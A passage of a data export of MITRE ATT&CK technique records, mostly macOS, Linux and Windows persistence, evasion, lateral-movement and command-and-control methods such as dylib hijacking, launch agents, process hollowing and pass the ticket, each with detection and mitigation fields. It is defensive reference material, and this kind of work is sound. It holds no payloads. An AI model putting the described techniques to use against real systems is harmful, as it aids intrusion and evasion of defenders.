code or even bypass whitelisting if launchctl is an allowed process.']",[],[],[],['Prevent users from installing their own launch agents or launch daemons and instead require them to be pushed out by group policy.'],"['MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Execution', 'Persistence']",Technique/T1152,['Launchctl'],https://attack.mitre.org/wiki/Technique/T1152
1459,['Monitor for execution of AppleScript through osascript that may be related to other suspicious behavior occurring on the system.'],[],[],[],"['API monitoring', 'System calls', 'Process Monitoring', 'Process command-line parameters']","['macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the <code>osalang</code> program.\nAppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. \n\nAdversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they\'re already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python [[CiteRef::Macro Malware Targets Macs]]. Scripts can be run from the command lie via <code>osascript /path/to/script</code> or <code>osascript -e ""script here""</code>.']",[],[],[],['Require that all AppleScript be signed by a trusted developer ID before being executed - this will prevent random AppleScript code from executing.'],"['MacOS', 'OS X']",['User'],[],[],"['Execution', 'Lateral Movement']",Technique/T1155,['AppleScript'],https://attack.mitre.org/wiki/Technique/T1155
1460,"['Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.']",[],[],[],"['File monitoring', 'Process Monitoring', 'Process command-line parameters']","['The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format <code>trap \'command list\' signals</code> where ""command list"" will be executed when ""signals"" are received.']",[],[],[],"[""Due to potential legitimate uses of trap commands, it's may be difficult to mitigate use of this technique.""]","['Linux', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Execution', 'Persistence']",Technique/T1154,['Trap'],https://attack.mitre.org/wiki/Technique/T1154
1461,"[""Objective-See's Dylib Hijacking Scanner can be used to detect potential cases of dylib hijacking. Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process.""]",[],[],[],['File monitoring'],"['macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence.\n\nA common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself[[CiteRef::Writing Bad Malware for OSX]][[CiteRef::Malware Persistence on OS X]].\nIf the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level. This can be used by adversaries as a privilege escalation technique.']",[],[],[],"[""Prevent users from being able to write files to the search paths for applications - both in the folders where applications are run from and the standard dylib folders. If users can't write to these directories, then they can't intercept the search path.""]","['MacOS', 'OS X']",['User'],[],[],"['Persistence', 'Privilege Escalation']",Technique/T1157,['Dylib Hijacking'],https://attack.mitre.org/wiki/Technique/T1157
1462,"['While users may customize their <code>~/.bashrc</code> and <code>~/.bash_profile</code> files , there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.']",[],[],[],"['File monitoring', 'Process Monitoring', 'Process command-line parameters', 'Process use of network']","[""<code>~/.bash_profile</code> and <code>~/.bashrc</code> are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. <code>~/.bash_profile</code> is executed for login shells and <code>~/.bashrc</code> is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), <code>~/.bash_profile</code> is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, <code>~/.bashrc</code> is executed. This allows users more fine grained control over when they want certain commands executed.\n\nMac's Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling <code>~/.bash_profile</code> each time instead of <code>~/.bashrc</code>.\n\nThese files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell.""]",[],[],[],['Making these files immutable and only changeable by certain administrators will limit the ability for adversaries to easily create user level persistence.'],"['Linux', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Persistence'],Technique/T1156,['.bash_profile and .bashrc'],https://attack.mitre.org/wiki/Technique/T1156
1463,[u'Monitor Launch Agent creation through additional plist files and utilities such as Objective-See\u2019s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.'],[],[],[],"['File monitoring', 'Process Monitoring']","[u'Per Apple\u2019s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>$HOME/Library/LaunchAgents</code>[[CiteRef::AppleDocs Launch Agent Daemons]][[CiteRef::OSX Keydnap malware]][[CiteRef::Antiquated Mac Malware]].  These launch agents have property list files which point to the executables that will be launched[[CiteRef::OSX.Dok Malware]].\n \nAdversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories [[CiteRef::Sofacy Komplex Trojan]] [[CiteRef::Methods of Mac Malware Persistence]]. The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in[[CiteRef::OSX Malware Detection]][[CiteRef::OceanLotus for OS X]]. They can be set up to execute when a specific user logs in (in the specific user\u2019s directory structure) or when any user logs in (which requires administrator privileges).']",[],[],[],"[""Restrict user's abilities to create Launch Agents with group policy.""]","['MacOS', 'OS X']","['User', 'Administrator']",[],[],['Persistence'],Technique/T1159,['Launch Agent'],https://attack.mitre.org/wiki/Technique/T1159
1464,"['Monitor the file system and shell commands for files being created with a leading ""."" and the Windows command-line use of attrib.exe to add the hidden attribute.']",['Host forensic analysis'],[],[],"['File monitoring', 'Process Monitoring', 'Process command-line parameters']","[u'To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\n===Windows===\n\nUsers can mark specific files as hidden by using the attrib.exe binary. Simply do <code>attrib +h filename</code> to mark a file or folder as hidden. Similarly, the \u201c+s\u201d marks a file as a system file and the \u201c+r\u201d flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively \u201c/S\u201d.\n\n===Linux/Mac===\n\nUsers can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name [[CiteRef::Sofacy Komplex Trojan]][[CiteRef::Antiquated Mac Malware]]. Files and folder that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles YES</code>, and then relaunch the Finder Application.\n\n===Mac===\n\nFiles on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app[[CiteRef::WireLurker]].\nMany applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys. \n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.']",[],[],[],['Mitigation of this technique may be difficult and unadvised due to the the legitimate use of hidden files and directories.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],"['Defense Evasion', 'Persistence']",Technique/T1158,['Hidden Files and Directories'],https://attack.mitre.org/wiki/Technique/T1158
1465,"['Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],['Walker Johnson'],"['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']","['A connection proxy is used to direct network traffic between systems or act as an intermediary for network communications. Many tools exist that enable traffic redirection through proxies or port redirection, including [[Software/S0040|HTRAN]], ZXProxy, and ZXPortMap.[[CiteRef::Trend Micro APT Attack Tools]]\n\nThe definition of a proxy can also be expanded out to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.\n\nThe network may be within a single organization or across organizations with trust relationships. Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.']",[],[],[],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1090,['Connection Proxy'],https://attack.mitre.org/wiki/Technique/T1090
1466,"['Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for [[Command and Control]] and system and network information [[Discovery]].']",[],[],[],"['File monitoring', 'Data loss prevention']","['Adversaries may move to additional systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into another system and executes. This may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system.']",[],[],[],"['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if it is not required for business operations.[[CiteRef::TechNet Removable Media Control]]\n\nIdentify potentially malicious software that may be used to infect removable media or may result from tainted removable media, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],"['Removable media allowed, Autorun enabled or vulnerability present that allows for code execution']",[],['Lateral Movement'],Technique/T1091,['Replication Through Removable Media'],https://attack.mitre.org/wiki/Technique/T1091
1467,['Monitor file access on removable media. Detect processes that execute when removable media is mounted.'],[],[],[],"['File monitoring', 'Data loss prevention']","['Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [[Technique/T1091|Replication Through Removable Media]]. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.']",[],[],[],['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if they are not required for business operations.[[CiteRef::TechNet Removable Media Control]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1092,['Communication Through Removable Media'],https://attack.mitre.org/wiki/Technique/T1092
1468,"['Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior.\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.']","['Process whitelisting', 'Anti-virus', 'Whitelisting by file name or path', 'Signature-based detection']",[],[],"['Process monitoring', 'API monitoring']","[""Process hollowing occurs when a process is created in a suspended state and the process's memory is replaced with the code of a second program so that the second program runs instead of the original program. Windows and process monitoring tools believe the original process is running, whereas the actual program running is different.[[CiteRef::Leitch Hollowing]]\n\nProcess hollowing may be used similarly to [[Technique/T1055|DLL Injection]] to evade defenses and detection analysis of malicious process execution by launching adversary-controlled code under the context of a legitimate process.""]",[],[],[],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior. \n\nAlthough process hollowing may be used to evade certain types of defenses, it is still good practice to identify potentially malicious software that may be used to perform adversarial actions, including process hollowing, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],"['Defense Evasion', 'Execution']",Technique/T1093,['Process Hollowing'],https://attack.mitre.org/wiki/Technique/T1093
1469,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['Adversaries may communicate using a custom command and control protocol instead of using existing [[Technique/T1071|Standard Application Layer Protocol]] to encapsulate commands. Implementations could mimic well-known protocols.'],[],[],[],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1094,['Custom Command and Control Protocol'],https://attack.mitre.org/wiki/Technique/T1094
1470,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],"['Use of a standard non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.[[CiteRef::Wikipedia OSI]] Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), and transport layer protocols, such as the User Datagram Protocol (UDP).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts;[[CiteRef::Microsoft ICMP]] however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.']",[],[],[],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1095,['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
1471,['Forensic techniques exist to identify information stored in EA.[[CiteRef::Journey into IR ZeroAccess NTFS EA]] It may be possible to monitor NTFS for writes or reads to NTFS EA or to regularly scan for the presence of modified information.'],"['Signature-based detection', 'Anti-virus', 'Host forensic analysis']",[],[],"['File monitoring', 'Kernel drivers']","['Data or executables may be stored in New Technology File System (NTFS) partition metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.[[CiteRef::Journey into IR ZeroAccess NTFS EA]]\n\nThe NTFS format has a feature called Extended Attributes (EA), which allows data to be stored as an attribute of a file or folder.[[CiteRef::Microsoft File Streams]]']",[],[],[],['It may be difficult or inadvisable to block access to EA. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to hide information in EA by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],['NTFS partitioned hard drive'],[],['Defense Evasion'],Technique/T1096,['NTFS Extended Attributes'],https://attack.mitre.org/wiki/Technique/T1096
1472,"['Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.\n\nEvent ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to ""Integrity check on decrypted field failed"" and indicates misuse by a previously invalidated golden ticket.[[CiteRef::CERT-EU Golden Ticket Protection]]']",[],[],['Ryan Becwar'],['Authentication logs'],"[""Pass the ticket (PtT)[[CiteRef::Aorato PTT]] is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nIn this technique, valid Kerberos tickets for [[Technique/T1078|Valid Accounts]] are captured by [[Technique/T1003|Credential Dumping]]. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.[[CiteRef::ADSecurity AD Kerberos Attacks]][[CiteRef::GentilKiwi Pass the Ticket]]\n\nSilver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).[[CiteRef::ADSecurity AD Kerberos Attacks]]\n\nGolden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.[[CiteRef::Campbell 2014]]""]",[],[],[],"['Monitor domains for unusual credential logons. Limit credential overlap across systems to prevent the damage of credential compromise. Ensure that local administrator accounts have complex, unique passwords. Do not allow a user to be a local administrator for multiple systems. Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts.[[CiteRef::ADSecurity AD Kerberos Attacks]]\n\nFor containing the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it.[[CiteRef::CERT-EU Golden Ticket Protection]]\n\nAttempt to identify and block unknown or malicious software that could be used to obtain Kerberos tickets and use them to authenticate by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],['Requires Microsoft Windows as a target system and Kerberos authentication enabled.'],[],['Lateral Movement'],Technique/T1097,['Pass the Ticket'],https://attack.mitre.org/wiki/Technique/T1097
1473,"['Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738.[[CiteRef::Microsoft User Modified Event]] Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems.\n\nUse of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.']",[],[],[],"['Authentication logs', 'API monitoring', 'Windows event logs']","['Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.']",[],[],[],['Use multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]].\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],[],['Credential Access'],Technique/T1098,['Account Manipulation'],https://attack.mitre.org/wiki/Technique/T1098
1474,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name [[Technique/T1036|Masquerading]] to hide malware and tools.[[CiteRef::WindowsIR Anti-Forensic Techniques]]']",[],[],[],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Defense Evasion'],Technique/T1099,['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
1475,"[""Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].""]",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to [[Exfiltration]].\n\nAdversaries may search connected removable media on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within [[Software/S0106|cmd]] may be used to gather information. Some adversaries may also use [[Technique/T1119|Automated Collection]] on removable media.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access removable media drive and files'],[],['Collection'],Technique/T1025,['Data from Removable Media'],https://attack.mitre.org/wiki/Technique/T1025
1476,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.\n\nCustom encryption schemes may vary in sophistication. Analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used.\n\nSome adversaries may also attempt to implement their own version of a well-known cryptographic algorithm instead of using a known implementation library, which may lead to unintentional errors.[[CiteRef::F-Secure Cosmicduke]]']",[],[],[],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1024,['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
1477,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","['Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system.']",[],[],[],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],Technique/T1027,['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
1478,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]] Correlating alerts between multiple communication channels can further help identify command-and-control behavior.']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['Some adversaries may split communications between different protocols.  There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions.  The split could also be random to simply avoid data threshold alerts on any one communication.']",[],[],[],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 